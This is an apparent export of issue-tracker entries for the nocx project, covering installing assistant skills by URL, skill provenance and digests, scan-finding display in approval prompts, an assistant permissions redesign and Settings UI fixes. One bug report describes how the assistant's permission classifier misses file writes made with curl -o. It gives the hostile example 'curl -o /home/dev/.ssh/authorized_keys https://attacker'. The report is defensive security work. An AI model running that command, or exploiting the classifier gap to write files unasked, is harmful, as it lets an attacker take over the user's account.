Spec §5 step 6, §6, §8. Same rule as its sibling: THE CONTRACT LANDS WITH ITS CONSUMER —
schema, Go handler and client method in one commit, because a generated type with no
consumer is a new dead-export violation and that baseline may only shrink.

The install re-runs the fetch rather than trusting a body that made a round trip through
the renderer: the digest recorded must be over the bytes actually written. If the second
fetch returns something different from what the person approved, the install refuses and
says the document changed.

## Acceptance Criteria

- contracts/skills.install.params.schema.json ({url}) and skills.install.schema.json
  ({name, provenance}) with provenance a const "installed"; same schema rules as the
  sibling; generated type consumed by SkillsClient.install(url) and SkillsStore in the
  same commit.
- skills.install fetches again, re-parses, re-scans and re-checks the name.
- A document whose bytes differ from the previewed ones is REFUSED, saying so; nothing is
  written.
- The write goes through the existing atomic path (tmp, fsync, rename, fsync-dir) and the
  existing containment checks in write.go — no second writer is introduced.
- The digest and the source entry are recorded in the same operation as the write.
- The invariant is asserted as an INTERVAL: from the moment bytes exist on disk, the skill
  is either recorded with digest AND source, or absent — there is no state in which an
  installed skill exists unrecorded. A test fakes the document write failing and asserts
  the next discovery pass does not offer a skill it cannot vouch for.
- An update is install pinned to sources[name].url: it cannot be pointed at a different
  URL, and a test asserts the refusal.
- An update whose on-disk digest no longer matches the recorded one REFUSES rather than
  overwriting — the person edited the file, and destructive replacement is an explicit
  answer, never the rerun default.
- ..._OverTheWireConformsToContract, off the real socket.
close_reason: 44ee6301. skills.install fetches again and compares against a digest skills.preview kept SERVER-side, one slot, so the client's only input is the URL that SELECTS the record and there is no field in which it could SUPPLY one — TestInstall_ReadingOneAddressDoesNotApproveAnother pins that previewing A does not authorise installing byte-identical bytes from B, and the approval is spent on success rather than standing. The digest written is hashSkillDirectory over the file AFTER it lands, never over the fetched text, asserted directly and again by discovery reporting approved. The interval invariant is asserted by making the document write fail (undo removes the file; nothing in List or Index; skills.json has neither half) and then making the undo ALSO fail, which is the same observable state as a process death between the writes — file present, List says changed, Index does not offer it, and the error says what state the disk was left in. For an update the end state is the restored previous bytes, because absent is the wrong answer for a skill that already existed. planInstall is now the one owner of 'may this document be written under this name from this URL', called by preview and install, which is what makes the update path previewable at all — it permits exactly one previously-refused case (holder installed, recorded source exactly this URL, on-disk digest still matching) and the edited-file refusal sits there too so a person is told before reading a body they could not adopt. No second writer: checkDirectory, checkExistingPath, pathsUnder and requireWritableRoot now take the root they check rather than reading the managed one. 16 tests; contract, generated type and SkillsClient.install landed together. All gates green including 6186 frontend tests. Spec section 8 records the preview-ledger decision and its cost (a backend restart between reading and approving refuses with 'read the document first').

title: skills.preview end to end: the schema, the handler and the client method in one commit
description:
Spec: .internal/specs/2026-09-03-installing-a-skill-by-url-design.md §4, §5 steps 1-5, §8.

THE CONTRACT LANDS WITH ITS CONSUMER. This bead absorbed what was briefed separately as
nocx-qja4m.3 ("declare the contracts first"), because that boundary could not pass the
pre-commit hook: a generated type with no consumer is a NEW dead-export violation, and
that ratchet's baseline may only shrink. So the schema, the Go handler and the client
method are one commit.

The read-only half: fetch, parse, refuse, scan, answer. It writes nothing, which is what
lets the person read the body before deciding.

Reuse internal/apifetch — the person-initiated fetch api.import.postman already goes
through — and therefore internal/httppolicy, which owns the http:// rule and the
credential boundary "for every HTTP client in nocx" and was extracted so a second caller
would not re-derive it.

## Acceptance Criteria

- contracts/skills.preview.params.schema.json ({url}) and skills.preview.schema.json
  ({name, description, body, url, findings[]}): draft 2020-12, $id under
  https://nocx.local/contracts/, additionalProperties: false, explicit required. A finding
  carries patternId, line and lineNumber — the same three fields
  agent.approvalRequested.schema.json:92-99 declares, because two shapes for one fact is
  how they come to disagree.
- npm run contracts regenerates frontend/src/generated/skills.preview.ts;
  npm run contracts:check is green with it committed; contracts/openrpc.json carries the
  method.
- The generated type has a consumer in the same commit: SkillsClient.preview(url) in
  frontend/src/skills-client.ts and the matching member on SkillsClientLike. npm run lint
  passes with no new dead-export entry.
- Registration follows ws_skill_handlers.go: a method on skillSettingsSource, a case, a
  validate...Raw, a regResponder in configSpecs.
- The fetch goes through apifetch/httppolicy; no second http.Client is constructed.
- A response over 64 KiB is REFUSED before parsing, not truncated, and the refusal states
  the ceiling.
- The document is parsed by the same frontmatter parser discovery uses; Content-Type is
  not consulted. A document that does not parse is refused with what was wrong.
- The name comes from the frontmatter and must match ^[a-z0-9][a-z0-9-]{0,63}$; the URL's
  path never names the skill.
- A name already held by any root is refused, naming the holder and its provenance.
- skill.Scan runs and EVERY finding is returned — not the first — each with pattern id,
  line and line number. A finding never makes the preview a refusal (scan.go:55-57).
- Failure-path tests, one per external call: the fetch errors; a non-2xx; a redirect chain
  past the bound; a body that is not UTF-8; an empty description; an over-long body.
- Nothing is written to disk on any path through this method — asserted, not assumed.
- ..._OverTheWireConformsToContract, off the real socket.
close_reason: 5a97bbfa. skills.preview on *skill.Store: profile.ValidateBaseURL, then apifetch.TextFetcher over httppolicy — the same fetcher the Postman import uses, injected at the composition root via skill.WithFetcher, so no second HTTP client exists anywhere. Refuses, each naming its step: over the 64 KiB ceiling before parsing rather than truncating; not losslessly decodable; a name discovery would not accept, taken from the frontmatter and never from the URL path; an empty description; a name any root already holds, named with its provenance through holderPhrase. Content-Type is never consulted. EVERY finding is returned, not the first, and a finding is never a refusal. holder(name) is now the one owner of 'who holds this name', read by refuseForeignCollision too. skill.Finding gained json tags rather than a fourth hand-rolled copy of the same three fields. Contract, generated type and SkillsClient.preview landed together per the dead-export rule, with findings inlined rather than in  for the same reason. 13 tests including every enumerated failure path and an assertion that nothing is written on any path; _DTOConformsToContract populated and empty; _OverTheWireConformsToContract off the real socket against an httptest endpoint through the real apifetch, plus a refusal over the wire. All gates green: go, golangci, deadcode 82 baselined 0 new, contracts:check, both tsc projects, npm run lint, and 6177 frontend tests.

title: Declare skills.preview and skills.install as contracts, before either has a handler
description:
Spec §8. Contracts are declared before the handlers, per contracts/README.md, so the
renderer's types are generated from the schema and the Go side is validated against it.

## Acceptance Criteria

- contracts/skills.preview.params.schema.json ({url}) and contracts/skills.preview.schema.json
  ({name, description, body, url, findings[]}) exist, draft 2020-12, $id under
  https://nocx.local/contracts/, additionalProperties: false, explicit required.
- contracts/skills.install.params.schema.json ({url}) and contracts/skills.install.schema.json
  ({name, provenance}) exist, same rules; provenance is a const "installed".
- A finding carries patternId, line and lineNumber — the same three fields
  agent.approvalRequested.schema.json:92-99 already declares, because two shapes for one
  fact is how they come to disagree.
- `npm run contracts` regenerates frontend/src/generated/skills.preview.ts and
  skills.install.ts, and `npm run contracts:check` is green with them committed.
- contracts/openrpc.json carries both methods (gen-openrpc discovers by directory listing).
close_reason: Folded into nocx-qja4m.4 and .5 before dispatch: the boundary could not pass the pre-commit hook. A JSON-RPC contract split from its only consumer leaves the generated type dead on arrival, and check-dead-exports' baseline may only SHRINK — its updater refuses to write one that grows — so 'contracts first, handlers later' has no committable state. Instrument from epic nocx-0c7qz, second instance of the same shape: a contract lands with its consumer, a package with its caller, an API change with its call sites. Each of .4 and .5 now carries its own schema, handler and client method in one commit.

title: skills.json records where a skill came from, so an update cannot reassign its provenance
description:
Spec §6.

`skills.json` holds exactly schemaVersion, disabled and digests (store_doc.go:24-28).
There is nowhere to say where a skill came from, and an update that cannot find the
source it was installed from either guesses or reassigns provenance — hermes deleted
its cross-registry fallback as "unsafe by construction" for exactly that reason.

## Acceptance Criteria

- `storage.Module{Name: "skills"}` is at Current: 2 and the document gains
  `sources: {"<name>": {"url": "...", "installedAt": "<RFC3339>"}}`.
- A v1 document loads as v2 with an empty sources map, and the next write persists v2.
- Reading is as strict as the existing digest reading (store_doc.go:137-158): a
  non-canonical name or an unparseable URL fails the WHOLE list into
  ListResult.DocumentError, naming the document path — it never degrades silently.
- A source entry is recorded and cleared alongside the digest, by the same calls
  (recordApprovalDigest / clearApprovalDigest / removeDiscovered).
- Provenance is never inferred from the presence of a source entry — a test asserts a
  source row for a name in the authored root changes nothing about its provenance.
- Backup carries the document unchanged, as it already does (backup.go Settings).
close_reason: 16a91d8f on feat/skills-page. skills.json is at schemaVersion 2 with an optional sources map (url, installedAt), keyed by name like digests, read as strictly: a non-canonical name, an unparseable or relative URL, userinfo, or a non-RFC3339 installedAt each fail the WHOLE list into DocumentError naming the file — 11 subtests. URL validation reuses profile.ValidateBaseURL rather than a second answer to 'is this an address'; its userinfo refusal keeps credentials out of a plaintext document. The version bump needed the migration rather than the reverse: storage.Module.Migrate refuses a stored version it has no rung FROM, so without {From:1,To:2} every existing skills.json would have failed closed the moment Current moved; the rung restamps through a raw-message map so an unknown field survives it. First migration any module in the repo declares; ADR-0055 binds only ContentDB, the convention followed is ADR-0011 section 6, and both ends are pinned (v1 loads and the next write persists v2; a newer document is refused). writeDocumentLocked now takes the loaded document instead of a parameter per map — the class fix, because a field a writer forgets to name is one the next toggle deletes. Nothing writes a source yet, deliberately: no producer of a URL exists until .5, so the parameter goes on recordApprovalDigest with its caller. A source row can never reassign provenance, asserted. gofmt/vet/golangci clean; skill, assistant, backup, transport and app all green; deadcode ratchet 82 baselined, 0 new.

title: The fourth root: a downloaded skill has a provenance of its own, and cannot shadow one you wrote
description:
Spec: .internal/specs/2026-09-03-installing-a-skill-by-url-design.md §3.

Provenance is the root (internal/skill/skill.go:1-12), so a downloaded skill cannot be
`authored` or `managed` without inheriting trust it did not earn. Add the fourth value
and its root, and extend every branch that reads provenance.

Precedence is slice order — `discoverDetailed`'s `seen` map at discover.go:133-136 is the
whole collision rule — so the installed root goes LAST, after managed. And the bare
`continue` that resolves a collision today is not good enough for an install: a person
who installs a skill and cannot find it in the list has been told nothing.

## Acceptance Criteria

- `skill.ProvenanceInstalled == "installed"` exists and the root
  `<ConfigDir>/installed-skills` is appended last in internal/app/app.go:559-563.
- `statusFor` (skill.go:40-45) treats installed like managed: it is hashed, compared to
  the recorded digest, and reports StatusChanged when the bytes moved.
- `discoverDetailed` hashes an installed skill (discover.go:144-154), so an installed
  skill with no recorded digest reports changed — fail closed, as managed does.
- `Approve` (store_doc.go:333) accepts installed; `Remove` (store_doc.go:368) accepts it;
  `Remove` still refuses builtin.
- `refuseForeignCollision` (write.go:294-305) still refuses the assistant a name held by
  an installed skill, with a message naming the holder's provenance.
- A test asserts an installed skill named the same as an authored one is dropped from
  discovery, and a second asserts the reverse never happens.
- A test asserts a skill in the installed root reaches the prompt index and is readable
  through skills.read like a managed one.
close_reason: a7698941 on feat/skills-page. skill.ProvenanceInstalled with root <ConfigDir>/installed-skills appended LAST in app.go:559-565. The four branches that asked 'is this managed' now ask Provenance.digested() — one owner instead of the same disjunction in statusFor, discovery, Approve and removeDiscovered — so an installed skill is hashed, compared, fails closed with no recorded digest, and stays out of the prompt index like a managed one. refuseForeignCollision still refuses the assistant an installed name, now naming the holder's provenance through holderPhrase. New internal/skill/installed_test.go (7 tests, including the direction that must never happen: an installed skill never displaces an authored or builtin one, asserted through Read on the bytes); a real *skill.Store driven through executeSkillsRead in internal/assistant; TestNew_SearchesTheInstalledSkillRootLast on the real composition root, which deadcode cannot report. Red-first evidence recorded for each. gofmt/vet/golangci clean; internal/skill, internal/assistant, internal/transport, internal/backup green; internal/app green in 158s; deadcode ratchet 82 baselined, 0 new. The contract went with it: skills.list's provenance enum permitted three values while the backend could emit a fourth, so the enum, the generated type and the badge arm landed in the same commit — a backend that can send what its own schema rejects is the defect rule 5 exists to catch, not something the surface bead inherits. The shadow refusal is deliberately NOT here: no caller until .5, and a Store method behind an interface is the one shape the deadcode ratchet cannot report (the ContentDB.Add shape). discoverDetailed + holderPhrase are what .5 needs and both are reachable.

title: A yes is an answer to a question, and every answer can be seen, understood and taken back
description:
Implements .internal/specs/2026-09-03-assistant-permissions-design.md and .internal/plans/2026-09-03-assistant-permissions.md.

The Agent policy page exposes the storage as though it were the person's task, and the layer a person actually produces by clicking "Allow always" — an invocation rule — is on the wire and has never been read by the renderer. This epic changes the unit of configuration to a sentence about a future question, closes the three model gaps that make the owner's own cases inexpressible, and rebuilds the page on a decision trace the backend computes.

The matrix (ADR-0020 §7) is unchanged in shape and moves to where it belongs: the default layer, named as questions nobody has answered yet.

Absorbs nocx-takqr.3. Supersedes nocx-j5fdf. Lands nocx-3j47q first and alone, because it is a P1 in shipped code.

## Success Criteria

A person asks the assistant about disk space. It proposes df -h; they answer Allow always. The scrollback says what was saved. They ask again in a new session and are not asked. Settings, Assistant permissions shows the answer; they widen it to any df command and df --output=source then runs unasked. They write a refusal — any command that writes a file to a path named by an option — and curl -o /tmp/proof https://example.com is refused, with the page naming which answer refused it. They forget both, and are asked again.

Watched end to end by e2e/assistant-permissions.spec.ts through cmd/nocx-server.

Deliberately out: wildcard subdomain syntax as text, workspace-level policy (nocx-mp2vd), presets, per-tool rules, regular expressions, stable executable identity, DNS-rebinding dial-time checks.
close_reason:
All 25 children closed. The happy path is watched end to end by e2e/assistant-permissions.spec.ts: a person opens Settings, sees which effects are answered and which are not, answers one, sees it move into the answered list with the words a person uses, takes it back, and the run's authority follows the document. The page it replaced (agent-policy-section.tsx) is gone, not deprecated.

Landed across the branch feat/agent-ploicy, merged to its head at 7e14c46d. All four CI gates were run on the merged tree: make ci, scripts/ci-linux.sh (both keyring variants), scripts/ci-frontend.sh, and the full two-browser e2e (558 passed, 9 skipped).

The one e2e red in that full run is NOT this epic's: it is a block.finished row missing on notification-centre-choice.spec.ts, diagnosed to frontend/src/lifecycle/projections.ts:184 and now carried by nocx-2vb9y, with nocx-mrtvy filed alongside it and nocx-dl1o0 fixed and closed on the way.

title: A skill's scan finding reaches the renderer and is never shown: the person approves bytes without the evidence
description:
The static scan is spec §6 layer 3, and its whole point is that a finding becomes
EVIDENCE in the approval rather than a silent downgrade: "On write it becomes evidence
in the approval, naming the pattern and the line." The evidence reaches the renderer and
stops there.

The wire carries it. `ApprovalRequest.Finding` is built in
`internal/assistant/kernel.go:1494-1520` for skills.create and skills.update, typed as
`SkillScanFinding` (`kernel.go:251-257`, whose own comment says "It is evidence for the
person approving the exact bytes, never the body itself"), sent at
`internal/transport/ws_agent.go:460` and `:1675`, declared in
`contracts/agent.approvalRequested.schema.json:92-99` and generated into
`frontend/src/generated/agent.approvalRequested.ts:80-82`.

The renderer never reads it. `frontend/src/agent-approval-prompt.tsx:617-631` renders
`ask().findings` — the EGRESS findings array, a different thing — and nothing reads the
singular `finding`. A case-insensitive grep for finding/Finding across
frontend/src/**/*.ts{,x} hits only the egress and vault machinery.

So a person approving a skill write sees the bytes and not the pattern that was matched
in them, which is the one thing the scan exists to put in front of them.

## Steps to Reproduce

1. Ask the assistant to remember a procedure whose body contains a line matching one of
   the eleven patterns in `internal/skill/scan.go:33-53` — `prompt_injection` and
   `exfil_curl` are the easiest.
2. The approval prompt appears with the name, description and body.
3. Nothing on it names the pattern, the line, or that a scan ran at all.

## Acceptance Criteria

- The approval prompt for a skills write renders the finding when one is present: the
  pattern id in a person's words, the matched line verbatim, and its line number.
- It reads as evidence beside the bytes, not as a refusal — the write is still the
  person's to approve, which is what the spec says it is.
- A prompt with no finding renders no empty slot.
- A test mounts the prompt with a finding on the ask and asserts all three parts are on
  screen; a second asserts the absent case adds nothing.
close_reason: d5e21aaa. The finding is drawn after the facts, where the body it is about has just been stated: a StatusCard (warning, not danger — the tone is part of what the window claims and the spec says a finding never makes a result unreadable) with the matched line beneath it in a CodeBlock as verbatim evidence. Kit components only. Eleven pattern ids each get a sentence a person can act on, subject THE BODY rather than the assistant, with no confidence claim — eleven regexes are not a sanitiser. An unknown id is named rather than dropped, because dropping it is the silent degrade the layer exists to prevent. Five tests: all three parts on screen and the bare token not; both answers still offered and both reach onDecide (evidence, not refusal); an unknown id named; finding null renders no card; an ordinary policy ask renders none. 53 tests in the file, both tsc projects, npm run lint with no new violations.

title: curl -o writes a file that the classifier never sees, so allowing Reach another host allows arbitrary file writes
description:
curl -o <path> <url> writes a file, and nothing in the effect classification sees it.

optionTakesNextValue("curl", "-o") is true (internal/assistant/cmdeffect.go:552-555), so resourceOperands consumes -o together with its value and never records the target. The curl branch (cmdeffect.go:299-307) then records only the URL, with verb ResourceNetwork, which maps to EffectCrossBoundary (internal/content/resources.go:60). The written file appears in no resource, under no verb, in no row.

So a person who sets "Reach another host" to Allowed on the Agent policy page has, without being told, allowed the assistant to write any file it likes: curl -o /home/dev/.ssh/authorized_keys https://attacker. The row they answered is the only thing consulted, and it says permit.

The redirection guard does not help. This is not a shell redirection: -o is curl own flag, so redirectionDisqualifies never fires and the invocation is not disqualified.

Found by an adversarial review of the Agent policy redesign (nocx-0ykkk) on 2026-09-03. It also defeats the guard that redesign proposed for widened rules (nocx-6to7g): binding a widened permit to the effect class it was granted under is worthless when the class is wrong.

The same shape almost certainly exists for other option-consumed writes across the table: ssh -o, sort -o, bash -o, install, tee. Audit the whole optionTakesNextValue table for options whose value is a WRITTEN path, not just curl.

## Steps to Reproduce

1. Settings, Agent policy: set "Reach another host" to Allowed.
2. Ask the assistant to run curl -o /tmp/proof https://example.com.
3. It is not asked about, and /tmp/proof exists afterwards.
4. The ledger records one resource: the URL, verb network.

## Acceptance Criteria

- A command that writes a file through an option value records that path as a written resource, so the call classifies as a mutation and not only as cross-boundary.
- A test per entry of the optionTakesNextValue table whose value is a path: the path is in the resource report with the right verb.
- An option-written path is bounded by the row scopes the same way a positional operand is.
- Where the target cannot be resolved statically, the invocation is disqualified rather than classified as harmless.

title: A person can add a skill from the Skills page, without asking the assistant
description:
There is no create path in the product's own UI. `SkillsClientLike` and `SkillsStore`
(frontend/src/skills-store.ts) expose `refresh`, `setEnabled`, `remove` and `approve`;
`skills.create` exists only as an agent tool the assistant calls after its approval prompt.
So the two ways to add a skill are to ask the assistant to remember a procedure, or to write
`SKILL.md` by hand under `<ConfigDir>/skills/<name>/` (internal/app/app.go:560) — which is
what the page's own empty state tells the person to do.

The design spec deliberately deferred EDITING a skill in Settings (2026-08-31 spec, §14);
CREATING one was never considered, so this is a gap rather than a deferral.

## Design questions to settle first

- What the affordance is: a New skill button opening a form, or one that writes a stub and
  hands the path to the person's editor.
- Whether the four trust layers apply when the author is the person rather than the model —
  the static scan certainly does, the approval prompt arguably does not.
- Where a person-authored skill lands: the authored root, and what happens to a name that
  collides with a builtin.

## Acceptance Criteria

- From Settings → Skills a person creates a skill and sees it in the list, without asking
  the assistant and without leaving the app to find the directory.
- The new skill is discovered by the next ask in any pane, and its content reaches the
  answer.
- The static scan runs on the person's bytes at the write boundary, and a refusal says what
  was rejected and where.
close_reason: Wrongly framed, superseded by nocx-qja4m. The bead asked for a New skill form on the Skills page. The assistant-authored path ALREADY SHIPS — skills.create as an agent tool, the summarizing role drafting the body, the approval prompt showing name, description and body before anything is written (nocx-si0dh, nocx-9ysnr) — so half of it asked for what exists. The other half asked for the wrong affordance: a person typing a procedure into a multiline field is not how skills arrive. The URL path spec section 14 deferred is the real gap, and it is an epic rather than a task because provenance is structural (spec section 6 layer 1), so a downloaded skill needs its own root, its own provenance and its own install pipeline. Filed as nocx-qja4m with the hermes and omp prior art recorded in it.

title: The Skills list row is hand-built from bare divs, so it looks like nothing else in Settings
description:
frontend/src/skills-section.tsx renders each skill as a bare `<div>` wrapping four naked
`<div>`s (name, description, `provenance · path`) followed by the switch and a loose
sentence, with no layout, no spacing and no separators — the switch collides with its own
caption. The kit already owns this composite: `RecordRow` inside
`CollectionView`/`CollectionRow`, whose docblock exists precisely because Connections and
Endpoints once described a record in two grammars.

No lint rule fired because every gate we have — `nocx/no-raw-controls`, the ARIA-role rule,
the kit-class rule — looks for a reimplemented CONTROL or a duplicated class, and a
classless, roleless `<div>` is invisible to all three.

## Steps to Reproduce

1. Open Settings → Skills.
2. The one row reads as four unstyled lines, and the enable switch sits flush against the
   text "Built-in skills cannot be deleted."
3. Compare with Connections or Endpoints, which render records through RecordRow.

## Acceptance Criteria

- Every skill row is a `RecordRow` inside a `CollectionView`: name as title, provenance as
  the kind badge, path as meta, enable switch and delete/re-approve in the action slot.
- skills-section.tsx contains no element carrying appearance that is not a kit component.
- The page is visually of a piece with Connections and Endpoints at the same density.
- The existing skills-section tests still assert behaviour (toggle, delete, re-approve,
  changed-since-approval) through the new structure.
- Recorded either way: whether the lint gate can be grown to see a hand-built record row,
  or why it cannot.
close_reason: bf4bca08. Every row in frontend/src/skills-section.tsx is RecordRow inside Section + Stack divided dense: name as title, provenance as the kind badge, description as meta, path in the detail slot's monospace, status only when the bytes changed since approval, and the switch plus Re-approve/Delete in an ActionGroup. The loose 'Built-in skills cannot be deleted' sentence is gone — a builtin has no Delete button and the absence says it. Tests locate a row by its visible name as Connections, Endpoints and Snippets do; a surface-owned wrapper was rejected with the measurement in the test's rowFor comment (stack.css puts divided/dense on direct children at specificity 0,4,0, overriding .ui-collection-row's own padding at 0,1,0, so a wrapper takes the rhythm and the row inside reverts to its gutter). npm run lint, both tsc projects and 69 frontend tests green.

title: The settings rail accepts two pages with one name: the registry has no uniqueness invariant
description:
`settingsPages()` in frontend/src/settings.tsx concatenates generated pages (derived from
declared sections) with hand-listed component pages and checks nothing about the join.
`assertValidKey` guards setting KEYS, `RegisterGroup` guards group IDS, and
`RegisterSectionGroup` guards a section's single group — none of them can see that a
generated section and a component page answer to the same title. The Skills pair slipped
through because the ids differ only in case ("Skills" vs 'skills') and no rule looks at
titles at all.

## Steps to Reproduce

1. Declare a setting whose `Section` equals the title of an existing component page.
2. Map that section into any group.
3. The rail renders two rows with one name, and every gate stays green.

## Acceptance Criteria

- The rail registry refuses two pages that share a title, or whose ids match
  case-insensitively — loudly, at the point the registry is built, naming both pages.
- A test constructs exactly that collision and asserts the refusal; it is RED on the tree
  before the sibling fix lands and stays green after.
- The refusal names the two sources (generated section vs component page) so the next
  person knows which end to edit.
close_reason: frontend/src/settings-rail-pages.ts in bf4bca08 owns the SettingsPage type and reconcileRailPages, called from settingsPages() in settings.tsx. A component page declaring ownsSection absorbs that section and mints no generated page; two pages left sharing a title, or ids differing only in case, throw with both ends named and ownsSection offered as the resolution. Eight tests in settings-rail-pages.test.ts.

title: One Skills entry, under Assistant: the toggle joins the page instead of minting a second one
description:
Two registries mint one name. `settings.SkillsEnabled` declares `Section: "Skills"`
(internal/settings/settings.go:662) and `RegisterSectionGroup("Skills", "application")`
(:1099), so the rail gets a generated page `id: "Skills"` holding one toggle;
frontend/src/settings.tsx:603 registers a component page `id: 'skills'`, `title: 'Skills'`,
`groupId: 'application'`. Neither sits in the group the feature belongs to — skills are an
assistant concern, beside Roles and Agent policy.

## Steps to Reproduce

1. Open Settings.
2. Read the rail: under APPLICATION there are two rows called Skills.
3. Open the first — one toggle, "Enable skills". Open the second — the skill list.
4. Neither appears under ASSISTANT, where Instructions, Answers, Endpoints, Roles and
   Agent policy are.

## Acceptance Criteria

- The rail lists Skills exactly once.
- That entry is under the `assistant` group.
- The `skills.enabled` toggle renders on that page, above the list, and writing it still
  goes through the ordinary settings write path.
- No generated section named Skills exists: `RegisterSectionGroup("Skills", …)` is gone and
  `settings.describe`'s `sectionGroups` has no Skills key.
- A frontend test asserts the rail has one row titled Skills and that its group is
  `assistant`.
close_reason: bf4bca08. The Skills page is groupId 'assistant', last after Agent policy, and owns section 'Skills'; RegisterSectionGroup("Skills", "application") is gone from internal/settings/settings.go with a comment saying why the section has no mapping. skills.enabled renders on the page above the list through the same SettingRow the generated body uses, so search, the modified dot (modifiedBySection now follows an owned section onto its page's rail row) and backup all still see it. Regression test 'a declaration in the Skills section adds no second rail row' in settings.test.ts, verified RED on origin/main's settings.tsx with 'expected 2 to be 1'.

title: The Skills page is one page, under Assistant, built from the kit
description: Skills for the built-in assistant (nocx-si0dh) shipped the machinery and left the surface unfinished: the rail shows two entries both called Skills, both filed under Application when skills are an assistant concern; the list row is hand-built from bare divs rather than the kit's record composite; and the only ways to add a skill are to ask the assistant or to write SKILL.md by hand.
acceptance_criteria:
## Success Criteria

- The settings rail lists Skills exactly ONCE, under ASSISTANT, beside Roles and Agent
  policy — and the skills.enabled toggle is on that page rather than on a page of its own.
- The rail registry REFUSES a second page with the same title (and the same id
  case-insensitively), with a test that is red on the tree before the fix.
- Every row on the page is the kit's RecordRow: name, provenance badge, path, the enable
  switch and the delete/re-approve actions in the action slot. No bare div carries
  appearance in skills-section.tsx.

## Deliberately out

- Adding a skill from the page. It was a criterion here and it was the wrong one: the
  assistant-authored path already ships (nocx-si0dh), and installing somebody else's
  skill by URL is an epic of its own — provenance is structural, so a downloaded skill
  needs its own root and its own pipeline. See nocx-qja4m.
- Sharing skills between machines, project-level roots.
close_reason: All four children closed; the surface work landed in bf4bca08 on feat/skills-page. One Skills row under Assistant (nocx-fe7fe.1), the rail registry now reconciles its two sources and refuses a duplicate name (nocx-fe7fe.2), and every row is the kit's RecordRow (nocx-fe7fe.3). The fourth criterion — a way to add a skill from the page — was removed rather than met: nocx-fe7fe.4 records why, and nocx-qja4m carries the real work.

title: Step 2: clarifying questions — what a person is actually trying to do on this page
